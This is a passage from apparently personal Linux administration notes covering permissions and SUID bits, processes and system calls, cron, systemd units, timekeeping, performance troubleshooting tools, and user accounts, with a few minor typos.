<li>Tracepoints are hard-coded instrumentation points placed at logical locations in kernel code.</li>
<li>Available tracepoints can be listed  using the <code>perf list tracepoint</code> command</li>
<li>Apart from showing when an event happened, tracepoints can also show contextual data about an event.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="pluggable-authentication-modules-pam"><a class="header" href="#pluggable-authentication-modules-pam">Pluggable Authentication Modules (PAM)</a></h1>
<ul>
<li>PAM (Pluggable Authentication Modules) is a flexible mechanism for authenticating users and managing authentication-related tasks in Unix-like operating systems.</li>
<li>PAM config files are typically stored in <code>/etc/pam.d</code></li>
<li>PAM modules are typically stored in <code>/lib64/security</code> or <code>/lib/security</code> depending on the architecture.</li>
<li>PAM configuration files are text files that define how authentication should be handled for various services and applications</li>
<li>Each PAM configuration file corresponds to a specific service or application (e.g., login, sshd, sudo) and contains a series of rules that specify which PAM modules to use and how to use them.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="per-process-analysis"><a class="header" href="#per-process-analysis">Per-Process Analysis</a></h1>
<p>These tools are process oriented and use counters that the kernel maintains Per-Process</p>
<ol>
<li><code>ps</code> - show process status, various process statistics, including memory and CPU usage</li>
<li><code>top</code> - Show top processes, sorted by CPU usage or another statistics</li>
<li><code>pmap</code> - List process memory segments with usage statistics</li>
</ol>
<p>These tools typically read statistics from the /proc ephemeral file-system.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="permissions"><a class="header" href="#permissions">Permissions</a></h1>
<p>Every Linux file has a set of permissions that determine who can read, write, or execute the file.
Running <code>ls -l</code> displays these permissions.</p>
<p>Only the owner of a file or dir can change permissions (the exception is the super user)</p>
<p>Example:</p>
<pre><code>$ ls -l init
-rwxr-xr-x 1 root root 1440152 May  7  2022 init*
</code></pre>
<p>-rw-r‚Äìr‚Äì 12 root     users 12.0K Apr  28 10:10 init*
|[-][-][-]-   [‚Äî‚Äî] [‚Äî]
| |  |  | |      |       |
| |  |  | |      |       +‚Äî‚Äî‚Äî‚Äì&gt; 7. Group
| |  |  | |      +‚Äî‚Äî‚Äî‚Äî‚Äî‚Äì‚Äì&gt; 6. Owner
| |  |  | +‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì&gt; 5. Alternate Access Method
| |  |  +‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì&gt; 4. Others Permissions
| |  +‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äì‚Äì&gt; 3. Group Permissions
| +‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì&gt; 2. Owner Permissions
+‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî&gt; 1. File Type</p>
<ol>
<li>File Types:</li>
</ol>
<ul>
<li>-: regular file</li>
<li>d: directory</li>
<li>l: symbolic link</li>
<li>p: pipe</li>
<li>s: socket</li>
<li>c: character device</li>
<li>b: block device</li>
</ul>
<ol start="2">
<li>Permissions can be read, write, or execute for user (#2 in text graphic above) , group (#3 in text graphic above), and others (#4 in text graphic above)</li>
</ol>
<h2 id="suid-gid-sticky-bit-permissions"><a class="header" href="#suid-gid-sticky-bit-permissions">SUID, GID, Sticky Bit Permissions</a></h2>
<h4 id="suid"><a class="header" href="#suid">SUID</a></h4>
<ul>
<li>SUID = Set UserId bit</li>
<li>When the SUID bit is set, the file is executed as the owner of the file, rather than the person running that file</li>
</ul>
<pre><code>$ touch suidfile
$ ls suidfile
suidfile
$ ll suidfile
-rw-rw-r--. 1 azureadmin azureadmin 0 Aug 28 17:46 suidfile
$ chmod 4660 suidfile
$ ls -l suidfile
-rwSrw----. 1 azureadmin azureadmin 0 Aug 28 17:46 suidfile
</code></pre>
<p>Find SUID files: <code>find . -perm /4000</code></p>
<h4 id="sgid"><a class="header" href="#sgid">SGID</a></h4>
<ul>
<li>File is executed as the owning group of the file, rather than the person running the file</li>
</ul>
<pre><code>$ touch sgidfile
$ chmod 2440 sgidfile
$ ll sgidfile
-r--r-S---. 1 azureadmin azureadmin 0 Aug 28 17:49 sgidfile
</code></pre>
<p>Find GUID Files: <code>find . -perm /2000</code></p>
<h4 id="sticky-bit"><a class="header" href="#sticky-bit">Sticky bit</a></h4>
<p>The sticky bit is typically set on public directories to inhibit file erasures by non-owners</p>
<h4 id="acls"><a class="header" href="#acls">ACLs</a></h4>
<ul>
<li>In addition to the standard UGO/RWX permission model, you can also apply ACLs to files and directories</li>
<li>ACLs define permissions for named users and named groups</li>
<li>ACLs are categorized into two groups, default ACLs and access ACLs
<ul>
<li>Access ACLs are set on individual files and directories</li>
<li>Default ACLs can only be applied at the directory level and are inherited by subdirectories and files</li>
</ul>
</li>
<li>There are two commands to manage ACLs
<code>getfacl</code> and <code>setfacl</code>
<code>setfactl -m user:mary:rwx /marysFile</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="processes"><a class="header" href="#processes">processes</a></h1>
<h2 id="threads"><a class="header" href="#threads">threads</a></h2>
<p>
In linux, some processes are divided into pieces called threads. Threads are very similar to processes. They have an identifier, TID (thread Id) and the kernel schedules and runs threads, just like processes. Processes do not usually share memory and I/O connections, threads do. All threads inside a single process share the same system resources.
</p>

<p>
Many processes have only one thread. A process with only one thread is known to be single-threaded. All processes start out single-threaded. This starting thread is often known as the main thread, and typically corresponds to a 'main' function within a program. This main thread is capable of starting new threads, depending on how the application is written. This is known multi-threading. Threads can run simultaneously on multiple processors/cores, speeding up computation. Threads start faster than processes and communicate more efficiently than processes. This is because threads share memory to communicate amongst themselves, and processes depend on IPC (inter-process communication) calls to communicate.
</p>

<p>
By default, the output of the `ps` and `top` commands do not show threads, only processes. However, you can modify this behavior:
</p>

<pre><code class="language-sh">ryan:// $ ps m |grep httping -A10
1121895 pts/1    -      0:00 httping -delay 2 www.google.com
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
</code></pre>
<p>
This is an example of a multi-threaded golang app. The top line with the PID represents the process, and each line below represents a thread within the process.
</p>

<h2 id="adjusting-process-priority"><a class="header" href="#adjusting-process-priority">adjusting process priority</a></h2>
<p>
You can change the way the kernel allocates CPU time to a process, relative to other processes. The kernel runs each process according to it's scheduling priority, known as it's `nice` value. This can be a value in range -20 - +19, with -20 being the highest priority. You can see this value for each process using `top` (the PR column). A regular user can only set nice values between 0 and 19, anything below 0 must be set by a superuser. Child processes will inherit the nice value of their parent. Use `ps -l` or `ps -lax` to view the niceness of a process.
</p>

<p>
use `renice` to change the niceness value of an *existing* process:
</p>

<pre><code class="language-sh">[ryan@nebula /]# renice -n 11 83883
83883 (process ID) old priority 10, new priority 11
</code></pre>
<h2 id="context-switching"><a class="header" href="#context-switching">Context Switching</a></h2>
<p>The OS performs context switching, or swapping process state on the CPU, as the primary mechanism behind multiprogramming (or time sharing). There are two main steps to context switching:
1) The OS Saves the context of the current process running on the CPU, including all of its register values (PC, stack pointers, general purpose registers, condition code, etc.), its memory state, and some other state (open files, etc.)
2) The OS restores the saved context from another process on the CPU and starts the CPU running this other process, continuing its execution from the instruction where it left off.</p>
<h2 id="process-state"><a class="header" href="#process-state">Process State</a></h2>
<p>In multiprogrammed systems, the OS must track and manage the multiple processes existing in the system at any given time. The OS maintains information about each process, including:
1) The process ID (PID)
2) The address space information for the process
3) The execution state of the process (CPU register values, stack location, etc.)
4) The set of resources allocated to the process (open files)
5) The current process state (ready, running, blocked, exited)
1) Ready - the process could run on the CPU but it is not currently scheduled
2) Running - The process is scheduled on the CPU and is actively executing
3) Blocked - The process is waiting for some event before it can continue being executed (waiting for data to be read from disk, etc.)
4) Exited - The process has exited but has not yet been cleaned up.</p>
<h2 id="creating-processes"><a class="header" href="#creating-processes">Creating Processes</a></h2>
<p>In Unix, the <code>fork</code> system call is used to create a new process. The process calling <code>fork</code> is the parent process and the new process is the child process. When fork() is called, the program must determine if it is the parent or the child process (typically using getpid()), and then determine how to proceed. If you want concurrency in your program, calling fork() is enough. However, to run a different image, the child process must call exec() (or one of it‚Äôs variants). After calling fork(), the program counter for both the parent and the child are the same. Once exec() is called, the parent process is wiped from memory of the child process address space.</p>
<h2 id="process-descriptors"><a class="header" href="#process-descriptors">Process Descriptors</a></h2>
<p>Linux maintains a process descriptor, which is a structure where the linux kernel maintains information about a single process. It contains all the information needed by the scheduler to maintain the process state machine.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="scheduled-tasks"><a class="header" href="#scheduled-tasks">Scheduled Tasks</a></h1>
<h1 id="cron"><a class="header" href="#cron">Cron</a></h1>
<ul>
<li>
<p>To add a cron job, simply add it to your crontab file by typing <code>crontab</code> in a shell</p>
</li>
<li>
<p>To see an example of a crontab, you can view <code>/etc/crontab</code></p>
</li>
<li>
<p>Example cronjob structure:</p>
<pre><code>  # Example of job definition:
  # .---------------- minute (0 - 59)
  # |  .------------- hour (0 - 23)
  # |  |  .---------- day of month (1 - 31)
  # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
  # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
  # |  |  |  |  |
  # *  *  *  *  * user-name command to be executed
  17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
  #
</code></pre>
</li>
<li>
<p>Each user can have their own crontab file. These files are usually stored in <code>/var/spool/cron/crontabs</code></p>
</li>
<li>
<p>To edit and install a crontab, run <code>crontab -e</code></p>
</li>
<li>
<p>To list your crontabs, run <code>crontab -l</code></p>
</li>
<li>
<p>To remove a crontab, you can run <code>crontab -r</code></p>
</li>
<li>
<p>The <code>/etc/crontab</code> file is the system-wide crontab.</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="bash-startup-files"><a class="header" href="#bash-startup-files">Bash Startup Files</a></h1>
<p>
In bash, you can choose from one of 4 startup files to place configuration you want to run at user login:
1) .bash_profile
2) .profile
3) .bash_login
4) .bashrc
<p>Which one should you use?</p>
<p>It‚Äôs recommended that you have a single .bashrc file with a symbolic link for .bash_profile pointing to the .bashrc file.</p>
</p>

<h2 id="login-shells"><a class="header" href="#login-shells">Login Shells</a></h2>
<p>A login shell is typically what you get when you first login to a system. The same is true for when you <code>ssh</code> to a system. You can tell if you are using a login shell by typing in <code>echo $0</code> at the shell. If you receive a <code>-</code> in the response, you are using a login shell. The basic idea is that the login shell is the initial shell. When <code>bash</code> runs as a login shell, it runs <code>/etc/profile</code>. This is a global profile file that applies to any user. It then looks for one of the four user-specific profile files mentioned above. It will run the first one that it sees.</p>
<h2 id="non-login-shells"><a class="header" href="#non-login-shells">Non-login shells</a></h2>
<p>Graphical user environments such as GNOME start-up in non-login shells, unless you specifically ask for a login shell. Upon starting a non-login shell, bash runs <code>/etc/bash.bashrc</code> and then runs the users <code>.bashrc</code></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="troubleshooting-storage"><a class="header" href="#troubleshooting-storage">Troubleshooting Storage</a></h1>
<ul>
<li>Disk I/O can be observed using <code>biosnoop</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="system-calls"><a class="header" href="#system-calls">System Calls</a></h1>
<ul>
<li>The kernel implements a programming interface for users of the system called the ‚Äòsystem call‚Äô interface. Users and programs interact with the OS through its system call interface.</li>
</ul>
<h2 id="common-system-calls"><a class="header" href="#common-system-calls">Common System Calls</a></h2>
<h3 id="fork"><a class="header" href="#fork">fork</a></h3>
<ul>
<li><code>fork</code> - Used to create a process. At the time of the fork, the child process inherits it‚Äôs execution state from the parent. This execution state includes the parent‚Äôs address space contents, CPU register values,  and any system resources it has allocated. The OS also creates a new process control struct (task struct), an OS data structure for managing the child process, and it assigns the child process a PID.</li>
<li>When the child process is first scheduled to run on the CPU, it starts executing where the parent process left off, at the return from the <code>fork</code> call.</li>
<li>From a programmer‚Äôs point of view, a call to <code>fork</code> returns twice. Once in the context of the running parent process, and once in the context of the running child process. In order to different the return values, a call to <code>fork</code> returns different values to the parent and child. The value returned to the parent is the PID of the child (or -1 if the fork fails), and the value returned to the child is always 0.</li>
<li>Example <code>fork</code> code:</li>
</ul>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;;
#include &lt;unistd.h&gt;;
int main()
{
 
    // make two process which run same
    // program after this instruction
    fork();
 
    printf("Hello world!\n");
    return 0;
}`
</code></pre>
<h3 id="exec"><a class="header" href="#exec">exec</a></h3>
<ul>
<li><code>exec</code> - Unix provides a family of <code>exec</code> system calls that trigger the OS to overlay the calling process‚Äôs image with a new image from a binary executable file.</li>
<li>Example:</li>
</ul>
<pre><code>#include &lt;unistd.h&gt;
 
int main(void) {
  char *programName = "ls";
  char *args[] = {programName, "-lh", "/home", NULL};
 
  execvp(programName, args);
 
  return 0;
}
</code></pre>
<h3 id="exit-and-wait"><a class="header" href="#exit-and-wait">exit and wait</a></h3>
<ul>
<li><code>exit</code> - to terminate, a process calls the <code>exit</code> syscall, which triggers the OS to clean up most of the processes execution state. After running the exit code, a process notifies it‚Äôs parent that it has exited. The parent is responsible for cleaning up the child‚Äôs remaining state from the system.</li>
<li>After executing the <code>exit</code> syscall, the OS delivers a <code>SIGCHLD</code> signal to the process‚Äôs parent process to notify it that its child has exited. The child then becomes a zombie process; it moves to the Exited state and can no longer run on the CPU. The execution state of a zombie process is partially cleaned up but the OS still maintains a little information about it, including about how it terminated. A parent process reaps its zombie child by calling the <code>wait</code> syscall.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="system-wide-analysis"><a class="header" href="#system-wide-analysis">System Wide Analysis</a></h1>
<p>These tools examine system-wide analysis in the context of system software or hardware resources, using kernel counters:</p>
<ol>
<li><code>vmstat</code> - virtual and physical memory statistics</li>
<li><code>mpstat</code> - per-cpu usage</li>
<li><code>iostat</code> - Per-disk I/O usage, reported from the block device interface</li>
<li><code>nstat</code> - TCP/IP stack statistics</li>
<li><code>sar</code> - various statistics; can also archive them for historical reporting</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="systemd"><a class="header" href="#systemd">Systemd</a></h1>
<ul>
<li>
<p>systemd is goal-oriented. These goals are defined as ‚Äòunits‚Äô</p>
</li>
<li>
<p>Units are systemd objects used for organizing boot and maintenance tasks. Units consist of mounts, services, sockets, devices, and timers, etc.</p>
</li>
<li>
<p>There are 11 unit types</p>
<ul>
<li>Services units tells the init system what it needs to know about the life cycle of an application</li>
<li>systemd is the init system typically</li>
<li>Use <code>systemctl cat sshd.service</code> to view the unit file for a service</li>
<li>Use <code>systemctl edit --full sshd.service</code> to edit a unit file</li>
<li>use <code>systemctl revert sshd.service</code> to revert the unit file to the default</li>
</ul>
</li>
<li>
<p>To prevent a service from being started, you can mask it</p>
<ul>
<li>systemctl mask sshd.service</li>
</ul>
</li>
<li>
<p>Targets are simply logical collections of units.</p>
<ul>
<li>
<p>Target files end in the <code>.target</code> extension.</p>
</li>
<li>
<p>Systemd includes several predefined targets:</p>
<ul>
<li>halt: shuts down and halts the system</li>
<li>poweroff: shuts down and powers off the system</li>
<li>shutdown: shuts down the system</li>
<li>rescue: boots into single user mode for recovery. All local file systems are mounted. Networking is disabled. Some essential services are started</li>
<li>emergency: Runs an emergency shell. The root file system is mounted in read-only mode, other file systems are not mounted. Network and other services are disabled</li>
<li>multi-user: full network support, but without a GUI</li>
<li>graphical: full network support with a GUI</li>
<li>reboot: shuts down and reboots the system</li>
<li>default: a special soft link that points to the default system boot target (multi-user or graphical)</li>
<li>hibernate: Puts the system into hibernation</li>
</ul>
</li>
<li>
<p><code>systemctl get-default</code> will show you the default target</p>
</li>
<li>
<p>use <code>systemctl set-default multi-user.target</code> to set the default operating mode, then reboot</p>
</li>
<li>
<p>Useful targets:</p>
</li>
<li>
<p>emergency.target = root file system is read-only. Minimal amount of programs loaded</p>
</li>
<li>
<p>rescue.target = a few services are loaded and you are dropped into a root shell</p>
<ul>
<li>You must have a password set for the root user to use either of these operating modes</li>
</ul>
</li>
<li>
<p>You can switch to a target without booting by typing <code>systemctl isolate graphical.target</code>, but this does not change the default boot target</p>
</li>
</ul>
</li>
<li>
<p>Each unit has its own config file</p>
</li>
<li>
<p>When you boot a system, you‚Äôre activating a default unit, usually a target unit called <code>default.target</code> that groups together a number of service and mount units as dependencies.</p>
</li>
<li>
<p>There are two main directories that store systemd unit files:</p>
<ul>
<li><code>/lib/systemd/system</code> or <code>/usr/lib/system/system</code> - system unit directory (avoid making changes. The operating system will maintain these files for you.)</li>
<li><code>/etc/systemd/system</code> - system configuration directory (make changes here)</li>
<li>You can check the current systemd configuration search path with this command: <code>systemctl -p UnitPath show</code></li>
</ul>
</li>
<li>
<p>You can interact with systemd using the <code>systemctl</code> command</p>
</li>
<li>
<p>One of <code>systemd</code>s features is the ability to delay a daemon startup until it is absolutely needed</p>
</li>
<li>
<p>While upgrading software, if systemd‚Äôs components are upgraded, you will typically need to reboot</p>
</li>
</ul>
<h4 id="systemd-example"><a class="header" href="#systemd-example">Systemd example</a></h4>
<p>Let‚Äôs create a simple echo service</p>
<p>First, define a socket (create a file named <code>echo.socket</code> in <code>/etc/systemd/system</code>)::</p>
<pre><code class="language-sh">[Unit]
Description=my echo socket

[Socket]
ListenStream=8081
Accept=true
</code></pre>
<p>Next, define a service for echoing a response (create a file named <code>echo@.service</code> in <code>/etc/systemd/system</code>):</p>
<pre><code class="language-sh">[Unit]
Description=my echo service

[Service]
ExecStart=/bin/cat
StandardInput=socket
</code></pre>
<p>Now, we need to start the socket we created in step 1.</p>
<pre><code class="language-sh">systemctl start echo.socket
</code></pre>
<p>We can get the status of our socket:</p>
<pre><code class="language-sh">ryan:system/ $ sudo systemctl status echo.socket
‚óè echo.socket - my echo socket
     Loaded: loaded (/etc/systemd/system/echo.socket; static)
     Active: active (listening) since Tue 2023-01-17 06:02:51 EST; 7s ago
     Listen: [::]:8081 (Stream)
   Accepted: 0; Connected: 0;
      Tasks: 0 (limit: 38033)
     Memory: 8.0K
        CPU: 911us
     CGroup: /system.slice/echo.socket

Jan 17 06:02:51 xerxes systemd[1]: Listening on my echo socket.
</code></pre>
<p>Now you can connect to the socket and see it repeat whatever you say!</p>
<pre><code class="language-sh">ryan:system/ $ nc localhost 8081
hello
hello
nice day, isn't it?
nice day, isn't it?
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="the-first-60-seconds"><a class="header" href="#the-first-60-seconds">The first 60 seconds</a></h1>
<p><code>Uptime</code> - Load averages to identify is load is decreasing or increasing over 1, 5, and 15 minute averages
<code>dmesg -T | tail</code> - Kernel errors including OOM events
<code>vmstat -SM 1</code> - System-wide statistics: run queue length, swapping, overall CPU usage
<code>mpstat -P ALL 1</code> - Per-CPU balance: a single busy CPU can indicate poor thread scaling
<code>pidstat 1</code> - Per-process CPU usage: identify unexpected CPU consumers, and user/system CPU time for each process.
<code>iostat -sxz 1</code> - Disk I/O statistics: IOPS and throughput, average wait time, percent busy.
<code>free -m</code> - Memory usage including the file system cache
<code>sar -n DEV 1</code> - Network device I/O: packets and throughput
<code>sar -n TCP,ETCP 1</code> - TCP statistics: connectionrates, retransmits
<code>top</code> - check overview</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="time"><a class="header" href="#time">time</a></h1>
<h1 id="system-time-and-the-hardware-clock"><a class="header" href="#system-time-and-the-hardware-clock">System time and the hardware clock</a></h1>
<ul>
<li>The kernel maintains the system clock, which is the clock that is consulted when you run commands like <code>date</code>. You can also update the system clock using the <code>date</code> command. However, you shouldn‚Äôt as you will never get the time exactly right.</li>
<li>PC hardware has a battery backed Real Time Clock (RTC). The kernel usually sets it‚Äôs time based on the RTC at boot. You can reset the system time to the current time of the RTC using <code>hwclock</code>. Keep your hardware clock in UTC to avoid any trouble with time zones or daylight savings time. You can set the RTC to your Kernel‚Äôs UTC clock using this command: <code>hwclock --systohc --utc</code></li>
<li>The kernel is very bad at keeping time. Because Linux systems will go days, months, or even years on a single boot, they typically will experience time drift. Becuase of this, you should configure the system clock to use NTP</li>
<li>The kernel‚Äôs system clock represents the current time as the number of seconds since <code>12 AM Midnight, January 1st 1970 UTC</code>. To see this number at the moment, run <code>date +%s</code></li>
<li>The time zone files on your system are in <code>/usr/share/zoneinfo</code></li>
</ul>
<h1 id="network-time-protocol-ntp"><a class="header" href="#network-time-protocol-ntp">Network Time Protocol (NTP)</a></h1>
<ul>
<li>NTP client services were once handled by an NTP daemon, but systemd has long since replaced this with a package named <code>timesyncd</code>.</li>
<li><code>timesyncd</code> can be controlled using <code>/etc/systemd/timesyncd.conf</code></li>
<li>If your machine does not have a persistent internet connection, you can use a daemon like <code>chronyd</code> to maintain the time during disconnects</li>
<li></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="troubleshooting-1"><a class="header" href="#troubleshooting-1">troubleshooting</a></h1>
<h2 id="measure-cpu-time-of-a-process"><a class="header" href="#measure-cpu-time-of-a-process">Measure CPU time of a process</a></h2>
<p>We can measure CPU time using <code>time</code>. Be aware that there are two implementations of <code>time</code>, and you may be running the wrong one. There is a bash built-in named <code>time</code>, which does not provide extensive statistics. You want to use the time utility at <code>/usr/bin/time</code>. Run <code>which time</code> to see which one you are using.</p>
<pre><code class="language-sh">ryan:// $ time httping -delay 2 www.google.com
Time				Count	Url				Result		Time		Headers
-----				-----	---				------		----		-------
[ 2023-01-21T09:29:49-05:00 ]	[ 0 ]	[ https://www.google.com ]	[ 200 OK ]	[ 136ms ]	[  :  ]
[ 2023-01-21T09:29:52-05:00 ]	[ 1 ]	[ https://www.google.com ]	[ 200 OK ]	[ 111ms ]	[  :  ]
[ 2023-01-21T09:29:54-05:00 ]	[ 2 ]	[ https://www.google.com ]	[ 200 OK ]	[ 105ms ]	[  :  ]
^C
Total Requests: 2

real	0m6.384s
user	0m0.000s
sys	0m0.021s
</code></pre>
<ul>
<li>Real time - represents the total time the application spent running. This is the user time + system (kernel) time + time spent waiting (the process could be waiting of various things‚Ä¶ waiting for CPU time, waiting on network resources, etc.)</li>
<li>User time - represents the time the CPU spent running the program itself</li>
<li>Sys time - represents the time the Kernel spent doing the process‚Äôs work (for example, reading files and directories)</li>
</ul>
<p>You can determine how much time the process spent waiting by substracting the user and sys times from the real time: <code>real - (user + sys) = time waiting</code>. You can see in the example above we spent ~6 seconds waiting, in this case we were waiting on network resources.</p>
<h2 id="measuring-and-troubleshooting-load-average"><a class="header" href="#measuring-and-troubleshooting-load-average">Measuring and troubleshooting load average</a></h2>
<p>You can use <code>uptime</code> to get the overall load average of the system:</p>
<pre><code class="language-sh">ryan:wc/ $ uptime
 09:43:44 up 5 days,  4:34,  1 user,  load average: 0.27, 0.36, 0.29
                                                       ^     ^     ^
                                                       |     |     |
                                                       |     |     -- 15 minutes
                                                       |     --------- 5 minutes
                                                       --------------- 1 minute
</code></pre>
<p><code>uptime</code> shows the overall time since the last reboot. It also shows load averages over 1 minutes, 5 minutes, and 15 minutes, respectively.</p>
<p>
If a load average goes up to around 1, a single process is likely using all of that CPU. With multi-core/processor systems, if a load average goes up to 2 (or more), this means that all cores have just enough to do all of the time. To troubleshoot processes, use `top` or (preferably) `htop`. Processes consuming more CPU than other's will typically rise to the top of the list.
</p>

<p>
A high load average doesn't necessarily mean there is a problem. If you see a high load average, but your system is responding well, don't panic. The system just has a lot of processes sharing the CPU. On servers with high compute demands (such as web servers or servers that serve in scientific computations), processes and threads are being started and stopped so quickly that the load averages will be skewed and innacurate. However, if a load average is high and the system performance is suffering, you are likely running into memory problems. When a system is low on memory, it will start to thrash, or rapidly swap pages to and from disk. This is less of a problem on modern systems using solid state storage such as SSDs or NVMe. On traditional systems with spinning media, this can be an issue.
<h2 id="measuring-and-troubleshooting-memory"><a class="header" href="#measuring-and-troubleshooting-memory">Measuring and troubleshooting memory</a></h2>
<p>
One of the simplest ways to view memory status on your system is to use the `free` command or view `/proc/meminfo`
</p>

<p>You can also use <code>vmstat</code> to view memory performance on a system. <code>vmstat</code> is one of the oldest utilities for this purpose. It has minimal overhead and is a no-frills kind of program. The output is a bit difficult to read for those who are unfamiliar. You can use it to see how often the kernel is swapping pages in and out, how busy the CPU is, and how I/O resources are being utilized. To use it, run <code>vmstat 2</code> (with 2 being the seconds in between updating the screen)</p>
<pre><code class="language-sh">ryan:todo$ vmstat 2
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 2  0      0 23791304 233996 4724548    0    0    30    30   10  237  5  1 94  0  0
 0  0      0 23807492 233996 4704048    0    0     0   164 2571 3426  2  2 96  0  0
 0  0      0 23806096 234004 4703776    0    0     0    34  586 1424  1  0 99  0  0
 0  0      0 23808876 234004 4703968    0    0     0    70  522 1152  1  0 99  0  0
 0  0      0 23816764 234004 4696736    0    0     0     0  591 1293  1  0 99  0  0
</code></pre>
</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="users-and-user-management"><a class="header" href="#users-and-user-management">Users and User Management</a></h1>
<p>At the kernel level, Linux users are just numbers (UIDs), but to make working with users easier, we assign usernames to these numbers. Usernames only exist in user-space. Because of this, any program that wants to work with users on a Linux system will need to translate these usernames to UIDs.</p>
<h1 id="etcpasswd"><a class="header" href="#etcpasswd">/etc/passwd</a></h1>
<p>The plantext <code>/etc/passwd</code> file contains entries for every user on a system. Each line represents a user and has 7 fields seperated by colons:</p>
<ol>
<li>the username</li>
<li>the encrypted password for the user (this is no longer used, replaced by <code>/etc/shadow</code>). An <code>x</code> in this field indicates that the password is stored in <code>/etc/shadow</code>. An asterisk <code>*</code> indicates that the user cannot login. If the password field is blank (i.e. you see double colons <code>::</code>), no password is required to login to this account.</li>
<li>The user Id</li>
<li>The group Id for the user (this field should correspond to one of the numbered entries in the <code>/etc/group</code> file)</li>
<li>The user‚Äôs real name (aka the GECOS field)</li>
<li>The user‚Äôs home directory</li>
<li>The user‚Äôs login shell</li>
</ol>
<h1 id="etcshadow"><a class="header" href="#etcshadow">/etc/shadow</a></h1>
<p>Contains encrypted passwords for user accounts</p>
<h1 id="special-users"><a class="header" href="#special-users">Special User‚Äôs</a></h1>
<p>You‚Äôll find a few special users on a Linux system:</p>
<ol>
<li>root - always has UID 0 and GID 0</li>
<li>daemon - never has login privileges</li>
<li>nobody - an underprivileged user. Some processes run as nobody because they cannot write to anything on the system</li>
</ol>
<h1 id="changing-a-password"><a class="header" href="#changing-a-password">Changing a password</a></h1>
<p>Becuase <code>/etc/passwd</code> is just a text file, you can technically modify it directly to change a user‚Äôs password. However, you shouldn‚Äôt do this. Instead, you can use the <code>passwd</code> command to change a password for a user. If for some reason you cannot use <code>passwd</code>, you should opt to use <code>vipw</code>. This command will prevent race conditions when modifying the <code>/etc/passwd</code> file. It also creates a backup of the file.</p>
<h1 id="suid-1"><a class="header" href="#suid-1">SUID</a></h1>
<p>When you temporarily switch to another user, all you are really doing is changing your user Id. There are two ways to do this, and the kernel handles both. The first way to with a setuid executable (sudo) and the second way is with a setuid system call.
The kernel has basic rules about what a process can or can‚Äôt do, but here are the three essentials that cover setuid executables and system calls:</p>
<ol>
<li>A process can run a setuid executable as long as it has adequate file permissions</li>
<li>A process running as root (user ID 0) can use setuid() system calls to become any other user</li>
<li>A process not running as root has severe restrictions on how it may use setuid() system calls. In most cases, it cannot.</li>
</ol>
<p>Because of these rules, you often need a combination of setuid executables and system calls to run a process as another user. For example, <code>sudo</code> has setuid root and once running, it may use setuid() syscalls to become another user.</p>
<h1 id="effictive-uid-euid-real-uid-ruid-and-saved-uid-saved-uid"><a class="header" href="#effictive-uid-euid-real-uid-ruid-and-saved-uid-saved-uid">Effictive UID (euid), Real UID (ruid), and Saved UID (saved UID)</a></h1>
<p>
Every process has more than one user Id. The effective user Id is the one you are likely familiar with. This is the user Id that the process is currently running as. However, the process also has a real user Id, which indicates who started the process. Normally, these two values are the same. However, when you execute a setuid program, Linux sets the euid (effective UID) to the ID of the running user, but keeps the original user Id in the ruid (real user Id). Processes also have a saved UID, but we will not need to work with this often.
</p>

<p>
As stated above, most processes have the same EUID and RUID. As a result, the default output for the `ps` command and other system diagnostic programs only show the EUID. To view both the EUID and RUID,  you can run:
</p>

<pre><code class="language-sh">ps -eo pid,euser,ruser,comm
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="bash-1"><a class="header" href="#bash-1">Bash</a></h1>
<h2 id="directory-map-25"><a class="header" href="#directory-map-25">Directory Map</a></h2>
<ul>
<li><a href="#bash-notes">bash_notes</a></li>
<li><a href="#moving-the-cursor-1">keyboard_shortcuts</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="bash-notes"><a class="header" href="#bash-notes">bash notes</a></h1>
<h2 id="variables-2"><a class="header" href="#variables-2">Variables</a></h2>
<h4 id="special-variables"><a class="header" href="#special-variables">Special Variables</a></h4>
<ul>
<li>$0 - The name of the Bash script.</li>
<li>$1 - $9 - The first 9 arguments to the Bash script.</li>
